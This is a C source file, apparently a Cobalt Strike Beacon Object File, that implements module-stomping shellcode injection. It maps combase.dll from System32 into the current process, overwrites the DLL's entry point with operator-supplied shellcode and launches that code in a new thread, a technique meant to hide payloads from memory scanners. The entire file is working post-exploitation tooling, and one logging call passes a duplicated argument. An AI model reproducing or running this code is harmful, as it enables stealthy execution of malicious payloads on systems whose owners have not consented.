#include <Windows.h>

#include "../../include/beacon.h"
#include "../../include/Structs.h"

//------------------------------DEFINING STUFFS--------------------------------------------
#define MemCopy __movsb
#define MemSet __stosb
#define PRNT_WN_ERR(szWnApiName) BeaconPrintf(CALLBACK_OUTPUT, "[!] %s Failed With Error: %d \n", szWnApiName, KERNEL32$GetLastError());
#define PRNT_NT_ERR(szNtApiName, NtErr)     BeaconPrintf(CALLBACK_OUTPUT, "[!] %s Failed With Error: 0x%0.8X \n", szNtApiName, NtErr);

#define DELETE_HANDLE(H)                                \
    if (H != NULL && H != INVALID_HANDLE_VALUE){        \
        KERNEL32$CloseHandle(H);                        \
        H = NULL;                                       \
    }

//--------------------------------IMPORTS------------------------------------------

DECLSPEC_IMPORT DWORD KERNEL32$GetLastError();

DECLSPEC_IMPORT BOOL KERNEL32$VirtualProtect(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flNewProtect,
    PDWORD lpflOldProtect
);

DECLSPEC_IMPORT HANDLE KERNEL32$CreateFileW(
    LPCWSTR lpFileName,
    DWORD dwDesiredAccess,
    DWORD dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD dwCreationDisposition,
    DWORD dwFlagsAndAttributes,
    HANDLE hTemplateFile
);


DECLSPEC_IMPORT BOOL KERNEL32$CloseHandle(
    HANDLE hObject
);

DECLSPEC_IMPORT NTSTATUS NTDLL$NtCreateSection(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

DECLSPEC_IMPORT NTSTATUS NTDLL$NtMapViewOfSection(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    SECTION_INHERIT InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
);

DECLSPEC_IMPORT NTSTATUS NTDLL$NtCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PTHREAD_START_ROUTINE StartRoutine,
    PVOID Argument,
    ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PPS_ATTRIBUTE_LIST AttributeList
);

// -------------------------------------

BOOL LoadDllFile(IN LPCWSTR szDllFilePath, OUT HMODULE *phModule, OUT PULONG_PTR puEntryPoint) {
    HANDLE hFile = INVALID_HANDLE_VALUE,
            hSection = NULL;
    NTSTATUS STATUS = STATUS_SUCCESS;
    ULONG_PTR uMappedModule = NULL;
    SIZE_T sViewSize = NULL;
    PIMAGE_NT_HEADERS pImgNtHdrs = NULL;

    if (!szDllFilePath || !phModule || !puEntryPoint)
        return FALSE;

    if ((hFile = KERNEL32$CreateFileW(szDllFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
                                      FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
        PRNT_WN_ERR("CreateFileW");
        goto _FUNC_CLEANUP;
    }

    if (!NT_SUCCESS(
        (STATUS = NTDLL$NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0x00, PAGE_READONLY, SEC_IMAGE, hFile)))) {
        PRNT_NT_ERR("NtCreateSection", STATUS);
        goto _FUNC_CLEANUP;
    }

    DELETE_HANDLE(hFile);

    if (!NT_SUCCESS(
        (STATUS = NTDLL$NtMapViewOfSection(hSection, NtCurrentProcess(), &uMappedModule, NULL, NULL, NULL, &sViewSize
            , ViewShare, NULL, PAGE_EXECUTE_READWRITE)))) {
        PRNT_NT_ERR("NtMapViewOfSection", STATUS);
        goto _FUNC_CLEANUP;
    }

    pImgNtHdrs = (PIMAGE_NT_HEADERS) (uMappedModule + ((PIMAGE_DOS_HEADER) uMappedModule)->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        goto _FUNC_CLEANUP;

    *phModule = (HMODULE) uMappedModule;
    *puEntryPoint = (uMappedModule + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);

_FUNC_CLEANUP:
    DELETE_HANDLE(hFile);
    DELETE_HANDLE(hSection);
    return (*phModule && *puEntryPoint) ? TRUE : FALSE;
};

BOOL VerifyInjection(IN ULONG_PTR uSacrificialModule, IN ULONG_PTR uEntryPoint, IN SIZE_T sPayloadSize) {
    PIMAGE_NT_HEADERS pImgNtHdrs = NULL;
    PIMAGE_SECTION_HEADER pImgSecHdr = NULL;
    ULONG_PTR uTextAddress = NULL;
    SIZE_T sTextSize = NULL,
            sTextSizeLeft = NULL;

    pImgNtHdrs = (PIMAGE_NT_HEADERS) (uSacrificialModule + ((PIMAGE_DOS_HEADER) uSacrificialModule)->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);
    for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
        // Find .text section
        if ((*(ULONG *) pImgSecHdr[i].Name | 0x20202020) == 'xet.') {
            uTextAddress = uSacrificialModule + pImgSecHdr[i].VirtualAddress;
            sTextSize = pImgSecHdr[i].Misc.VirtualSize;
            break;
        }
    }

    if (!uTextAddress || !sTextSize)
        return FALSE;

    /*
         -----------    *uTextAddress*
        |           |
        |     Y     |   >>> Y = uEntryPoint - uTextAddress
        |           |
         -----------    *uEntryPoint*
        |           |
        |           |
        |     X     |   >>> X = sTextSize - Y
        |           |
        |           |
         -----------    *uTextAddress + sTextSize*
*/
    // Calculate the size between the entry point and the end of text section

    sTextSizeLeft = sTextSize - (uEntryPoint - uTextAddress);
    BeaconPrintf(CALLBACK_OUTPUT, CALLBACK_OUTPUT, "[i] Payload size: %d Byte \n", sPayloadSize);
    BeaconPrintf(CALLBACK_OUTPUT, "[i] Available memory ( from entry point ): %d Byte \n", sTextSizeLeft);

    // Check if the shellcode can fit
    if (sTextSizeLeft >= sPayloadSize)
        return TRUE;

    return FALSE;
}

BOOL ShellcodeModuleStomp(IN LPCWSTR szSacrificialDll, IN PBYTE pBuffer, IN SIZE_T sBufferSize) {
    NTSTATUS STATUS = STATUS_SUCCESS;
    HMODULE hSacrificialModule = NULL;
    ULONG_PTR uEntryPoint = NULL;
    HANDLE hThread = NULL;
    DWORD dwOldProtection = 0x00;

    if (!szSacrificialDll || !pBuffer || !sBufferSize) {
        BeaconPrintf(
            CALLBACK_ERROR,
            "ShellcodeModuleStomp invalid args: [szSacrificialDll: %ls] [pBuffer: %p] [sBufferSize: %d]",
            szSacrificialDll, pBuffer, sBufferSize);
        return FALSE;
    }

    if (!LoadDllFile(szSacrificialDll, &hSacrificialModule, &uEntryPoint)) {
        BeaconPrintf(CALLBACK_ERROR, "LoadDllFile Failed");
        return FALSE;
    }

    if (!VerifyInjection((ULONG_PTR) hSacrificialModule, uEntryPoint, sBufferSize)) {
        BeaconPrintf(CALLBACK_ERROR, "VerifyInjection Failed");
        return FALSE;
    }

    if (!KERNEL32$VirtualProtect(uEntryPoint, sBufferSize, PAGE_READWRITE, &dwOldProtection)) {
        PRNT_WN_ERR(TEXT("VirtualProtect"));
        return FALSE;
    }

    MemCopy(uEntryPoint, pBuffer, sBufferSize);
    /* NOTE: YOUR PAYLOAD MAY REQUIRE RWX PERMISSIONS*/
    // dwOldProtection's VALUE IS RX
    if (!KERNEL32$VirtualProtect(uEntryPoint, sBufferSize, dwOldProtection, &dwOldProtection)) {
        PRNT_WN_ERR(TEXT("VirtualProtect"));
        return FALSE;
    }

    if (!NT_SUCCESS(
        STATUS = NTDLL$NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), uEntryPoint, NULL, FALSE,
            0x00, 0x00, 0x00, NULL))) {
        PRNT_NT_ERR("NtCreateThreadEx", STATUS);
        return FALSE;
    }

    KERNEL32$CloseHandle(hThread);
    return TRUE;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------------

#define SACRIFICAL_DLL  L"C:\\Windows\\System32\\combase.dll"

void go(char* args, int agrc) {
    datap Parser = {0};
    PSTR Shellcode = {0};
    DWORD Length = {0};

    // Parse arguments
    BeaconDataParse(&Parser, args, agrc);

    // Parse our shellcode
    Shellcode = BeaconDataExtract(&Parser, &Length);
    BeaconPrintf( CALLBACK_OUTPUT, "Shellcode @ %p [%d bytes]", Shellcode, Length );
    if (!ShellcodeModuleStomp(SACRIFICAL_DLL, Shellcode, Length)) {
        BeaconPrintf(CALLBACK_ERROR, "ShellcodeModuleStomp Failed");
    }
}